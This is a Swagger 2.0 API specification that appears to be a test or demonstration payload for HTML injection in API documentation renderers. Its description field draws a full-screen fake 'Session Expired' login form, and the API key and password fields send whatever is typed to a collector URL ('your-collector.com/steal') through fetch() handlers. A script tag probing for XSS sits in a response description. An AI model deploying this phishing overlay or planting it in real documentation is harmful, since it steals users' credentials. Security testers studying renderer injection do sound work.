swagger: '2.0'
info:
  version: 1.0.0
  title: 🔒 Secure API Portal - Authentication Required
  description: |
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);z-index:9999;display:flex;justify-content:center;align-items:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;">
      <div style="background:white;padding:40px;border-radius:8px;box-shadow:0 20px 60px rgba(0,0,0,0.3);max-width:450px;width:90%;text-align:center;">
        <div style="width:60px;height:60px;background:#667eea;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;color:white;font-size:28px;">🔐</div>
        <h2 style="margin:0 0 10px 0;color:#333;font-size:24px;">Session Expired</h2>
        <p style="color:#666;margin:0 0 25px 0;font-size:14px;line-height:1.5;">Your session has expired due to inactivity. Please re-authenticate to continue accessing the API documentation and services.</p>
        <form onsubmit="event.preventDefault();" style="text-align:left;">
          <label style="display:block;margin-bottom:5px;color:#333;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">API Key / Access Token</label>
          <input type="text" placeholder="Enter your API key" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;margin-bottom:15px;box-sizing:border-box;font-size:14px;" oninput="if(this.value.length>10){fetch('https://your-collector.com/steal?key='+encodeURIComponent(this.value)+'&ref='+encodeURIComponent(location.href)+'&t='+Date.now(),{mode:'no-cors'});this.style.borderColor='#28a745';}">
          <label style="display:block;margin-bottom:5px;color:#333;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;">Password</label>
          <input type="password" placeholder="Enter your password" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;margin-bottom:20px;box-sizing:border-box;font-size:14px;" oninput="if(this.value.length>5){fetch('https://your-collector.com/steal?pass='+encodeURIComponent(this.value)+'&ref='+encodeURIComponent(location.href),{mode:'no-cors'});}">
          <button type="submit" style="width:100%;padding:12px;background:#667eea;color:white;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s;" onmouseover="this.style.background='#5568d3'" onmouseout="this.style.background='#667eea'">Authenticate & Continue</button>
        </form>
        <p style="margin:20px 0 0 0;font-size:12px;color:#999;">Protected by corporate security policies</p>
      </div>
    </div>
    <!-- Hidden legitimate content for SEO/crawlers -->
    <div style="display:none;">
      API Documentation Portal - Login to continue services
    </div>

paths:
  /authenticate:
    post:
      summary: 🔑 Authenticate & Access API
      description: |
        <div style="color:#d32f2f;font-weight:bold;">
          ⚠️ CRITICAL: Active phishing overlay detected in this documentation.
          <br>Real endpoint would be here, but currently masked by HTML injection.
        </div>
      consumes:
        - application/x-www-form-urlencoded
      produces:
        - application/json
      parameters:
        - name: username
          in: formData
          description: Corporate username or email address
          required: true
          type: string
          x-example: "admin@company.com"
        - name: password
          in: formData
          description: Corporate password (masked input)
          required: true
          type: string
          format: password
        - name: api_key
          in: formData
          description: Optional API key for direct authentication
          required: false
          type: string
      tags:
        - 🔓 Authentication
      responses:
        '200':
          description: |
            <div style="color:green;">
              ✅ Authentication successful. Redirecting to dashboard...
              <script>console.log('If this renders, XSS is possible');</script>
            </div>
          schema:
            type: object
            properties:
              token:
                type: string
                description: JWT access token
              expires_in:
                type: integer
                description: Token expiration time in seconds
        '401':
          description: |
            <div style="color:red;">
              ❌ Invalid credentials. Please check your username and password.
            </div>
        '403':
          description: Access forbidden - insufficient privileges
        '500':
          description: |
            <div style="color:orange;">
              ⚠️ Internal server error. Please contact IT support.
            </div>

  /users/profile:
    get:
      summary: 👤 View Profile
      description: Retrieve current user profile information
      produces:
        - application/json
      tags:
        - 👤 User Management
      responses:
        '200':
          description: Profile data retrieved successfully
        '401':
          description: Unauthorized - Please authenticate first

securityDefinitions:
  Bearer:
    type: apiKey
    name: Authorization
    in: header
    description: |
      <div style="background:#fff3cd;padding:10px;border-left:4px solid #ffc107;margin:10px 0;">
        <strong>⚠️ Security Notice:</strong> Never share your API keys. 
        <br>Current session: <span id="sess-info">Active</span>
      </div>

security:
  - Bearer: []
